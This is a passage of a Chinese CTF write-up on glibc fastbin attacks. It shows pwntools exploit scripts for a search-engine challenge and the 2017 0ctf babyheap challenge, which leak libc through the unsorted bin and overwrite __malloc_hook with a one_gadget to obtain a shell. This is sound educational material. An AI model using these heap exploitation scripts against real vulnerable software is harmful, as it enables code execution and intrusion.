        search_word('m')
        io.recvuntil('Delete this sentence (y/n)?\n')
        io.sendline('y')
        search_word('\x00')
        io.recvuntil('Found ' + str(len(smallbin_sentence)) + ': ')
        unsortedbin_addr = u64(io.recv(8))
        io.recvuntil('Delete this sentence (y/n)?\n')
        io.sendline('n')
        return unsortedbin_addr
    def exp():
        # 1. leak libc base
        unsortedbin_addr = leak_libc()
        main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena
        libc_base = main_arena_addr - main_arena_offset
        log.success('unsortedbin addr: ' + hex(unsortedbin_addr))
        log.success('libc base addr: ' + hex(libc_base))
        # 2. create cycle fastbin 0x70 size
        index_sentence('a' * 0x5d + ' d ')  #a
        index_sentence('b' * 0x5d + ' d ')  #b
        index_sentence('c' * 0x5d + ' d ')  #c
        # a->b->c->NULL
        search_word('d')
        io.recvuntil('Delete this sentence (y/n)?\n')
        io.sendline('y')
        io.recvuntil('Delete this sentence (y/n)?\n')
        io.sendline('y')
        io.recvuntil('Delete this sentence (y/n)?\n')
        io.sendline('y')
        # b->a->b->a->...
        search_word('\x00')
        io.recvuntil('Delete this sentence (y/n)?\n')
        gdb.attach(io)
        io.sendline('y')
        io.recvuntil('Delete this sentence (y/n)?\n')
        io.sendline('n')
        io.recvuntil('Delete this sentence (y/n)?\n')
        io.sendline('n')
        # 3. fastbin attack to malloc_hook nearby chunk
        fake_chunk_addr = main_arena_addr - 0x33
        fake_chunk = p64(fake_chunk_addr).ljust(0x60, 'f')
        index_sentence(fake_chunk)
        index_sentence('a' * 0x60)
        index_sentence('b' * 0x60)
        one_gadget_addr = libc_base + 0xf02a4
        payload = 'a' * 0x13 + p64(one_gadget_addr)
        payload = payload.ljust(0x60, 'f')
        index_sentence(payload)
    if __name__ == '__main__':
        exp()
        io.interactive()
## 2017 0ctf babyheap
### 漏洞点
    __int64 __fastcall fill(chunk *a1)
    {
      __int64 result; // rax
      int v2; // [rsp+18h] [rbp-8h]
      int v3; // [rsp+1Ch] [rbp-4h]
      printf("Index: ");
      result = read_num();
      v2 = result;
      if ( (int)result >= 0 && (int)result  0 )
          {
            printf("Content: ");
            result = read_content(a1[v2].ptr, v3);
          }
        }
      }
      return result;
    }
这里写任意长度，堆溢出，原来想unlink发觉没全局变量
    __int64 __fastcall free_chunk(chunk *a1)
    {
      __int64 result; // rax
      int v2; // [rsp+1Ch] [rbp-4h]
      printf("Index: ");
      result = read_num();
      v2 = result;
      if ( (int)result >= 0 && (int)result <= 15 )
      {
        result = LODWORD(a1[(int)result].inuse);
        if ( (_DWORD)result == 1 )
        {
          LODWORD(a1[v2].inuse) = 0;
          a1[v2].size = 0LL;
          free(a1[v2].ptr);
          result = (__int64)&a1[v2];
          *(_QWORD *)(result + 16) = 0LL;
        }
      }
      return result;
    }
free后没有置空，存在double free
### 漏洞利用过程
  1. 这道题我原来觉得很简单，后面自己做起来才发觉问题较多，不是难，而是细节性的问题比较多
  2. 大体思路是构造unsortbin泄露libc地址，然后通过覆盖malloc_hook成one_gadget拿到shell
  3. 细节点1：你会发觉这道题你没有全局变量，所以要在堆上做文章，通过连续free两个chunk，第一个free的chunk的fd会指向第二个
  4. 细节点2：要绕过fastbin的长度检测，所以要多次溢出修改size，这里我建议不要急着free，我自己做的时候先free就出错了
  5. 细节点3： idx问题， 要注意标记好idx，不然自己都不知道哪个对应哪个
  6. 具体在exp里在标注下注释就好了
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    local = True
    # Set up pwntools for the correct architecture
    exe = './' + 'babyheap'
    elf = context.binary = ELF(exe)
    #don't forget to change it
    host = '127.0.0.1'
    port = 10000
    #don't forget to change it
    #ctx.binary = './' + 'babyheap'
    ctx.binary = exe
    libc = args.LIBC or 'libc.so.6'
    ctx.debug_remote_libc = True
    ctx.remote_libc = libc
    if local:
        context.log_level = 'debug'
        io = ctx.start()
        libc = ELF(libc)
    else:
        io = remote(host,port)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled
    def Allocate(size):
        io.sendlineafter("Command: ", "1")
        io.sendlineafter("Size: ", str(size))
    def Dump(idx):
        io.sendlineafter("Command: ", "4")
        io.sendlineafter("Index: ", str(idx))
    def Fill(idx, size, content):
        io.sendlineafter("Command: ", "2")
        io.sendlineafter("Index: ", str(idx))
        io.sendlineafter("Size: ", str(size))
        io.sendlineafter("Content: ", content)
    def Free(idx):
        io.sendlineafter("Command: ", "3")
        io.sendlineafter("Index: ", str(idx))
    def test():
        Allocate(0x10)
        Dump(0)
        Fill(0, 0x10, 'a'*0x18)
        Free(0)
    def exp():
        #test()
        Allocate(0x10) #0
        Allocate(0x10) #1
        Allocate(0x10) #2
        Allocate(0x10) #3
        Allocate(0x80) #4
        #细节点1
        Free(2)
        Free(1)
        payload = 'a'*0x10 + p64(0) + p64(0x21) + p8(0x80)
        Fill(0, len(payload), payload)
        payload = 'a'*0x10 + p64(0) + p64(0x21)
        #细节点2
        Fill(3, len(payload), payload)
        Allocate(0x10) #1
        Allocate(0x10) #2
        payload = 'a'*0x10 + p64(0) + p64(0x91)
        #细节点2
        Fill(3, len(payload), payload)
        Allocate(0x80) #5
        Free(4) 
        Dump(2)
        io.recvuntil("Content: \n")
        libc_base = u64(io.recv(6).strip().ljust(8, '\x00')) - 0x3c4b78
        io.success("libc_base: 0x%x" % libc_base)
        malloc_hook = libc_base + libc.symbols['__malloc_hook']
        io.success("malloc_hook: 0x%x" %malloc_hook)
        one_gadget = 0x45216 
        one_gadget = 0x4526a #0xf02a4 0xf1147
        one_gadget = one_gadget + libc_base 
        ptr = malloc_hook-0x20-0x3
        Allocate(0x60) #4
        Free(4)
        payload = p64(ptr)
        Fill(2, len(payload), payload)
        Allocate(0x60) #4
        Allocate(0x60) #6
        payload = 'a'*0x13 + p64(one_gadget)
        Fill(6, len(payload), payload)
        Allocate(0x20) #7
        #gdb.attach(io)
    if __name__ == '__main__':
        exp()
        io.interactive()
## 总结
  1. fastbin的题目相对来说不难，可能是因为前面有基础了的原因了吧，以后多做下题巩固下就好
  2. double free也是常用的攻击手段
  3. 逆向还得多学习，像搜索引擎那题，看都看不懂题目，做什么题。。。
## 参考链接
[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/)